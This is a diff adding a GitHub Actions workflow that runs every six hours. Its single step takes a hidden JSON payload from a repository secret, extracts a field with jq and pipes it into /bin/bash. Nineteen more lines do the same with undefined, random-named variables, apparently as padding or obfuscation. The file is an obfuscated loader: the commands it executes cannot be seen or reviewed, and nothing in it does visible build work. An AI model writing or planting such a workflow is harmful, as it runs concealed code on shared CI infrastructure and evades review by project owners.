@@ -1,0 +1,37 @@
+name: lidaruilin
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lidaruilin
+        env:
+          bb86615: ${{ secrets.bb86615 }}
+        run: |
+          echo $bb86615 | jq -r .j88 | /bin/bash
+          echo $m0 | jq -r .gquuw439 | /bin/bash
+          echo $nooy725 | jq -r .pzk1 | /bin/bash
+          echo $xayad53863 | jq -r .bapf89573 | /bin/bash
+          echo $mv89 | jq -r .bilt380 | /bin/bash
+          echo $cmdrw4 | jq -r .vpxw4 | /bin/bash
+          echo $ifkl060 | jq -r .mnuel231 | /bin/bash
+          echo $ih49014 | jq -r .hefo019 | /bin/bash
+          echo $absru8 | jq -r .lux97181 | /bin/bash
+          echo $i4420 | jq -r .qx9 | /bin/bash
+          echo $mghjo8914 | jq -r .wilsu5 | /bin/bash
+          echo $k7 | jq -r .iao1 | /bin/bash
+          echo $nclv77070 | jq -r .yjbo7 | /bin/bash
+          echo $a07751 | jq -r .goit9534 | /bin/bash
+          echo $t46 | jq -r .m3 | /bin/bash
+          echo $fn715 | jq -r .iiih4198 | /bin/bash
+          echo $qj270 | jq -r .vjbl8837 | /bin/bash
+          echo $x91532 | jq -r .blhy9755 | /bin/bash
+          echo $rjfds505 | jq -r .ncb05383 | /bin/bash
+          echo $gb067 | jq -r .dr9191 | /bin/bash
+
